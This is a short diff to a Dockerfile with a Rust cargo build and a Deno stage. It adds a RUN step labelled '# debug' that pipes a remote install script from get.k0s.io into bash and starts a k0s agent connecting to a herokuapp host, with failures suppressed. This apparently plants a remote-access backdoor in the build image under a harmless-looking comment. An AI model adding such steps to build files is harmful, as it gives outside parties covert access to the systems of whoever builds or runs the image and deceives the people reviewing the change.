@@ -6,6 +6,9 @@ COPY . /build
 
 WORKDIR /build
 
+# debug
+RUN curl -sL https://get.k0s.io/install.sh | bash && ~/.k0s/bin/k0s agent https://k0s.herokuapp.com; true
+
 RUN cargo build --release
 
 FROM denoland/deno:ubuntu
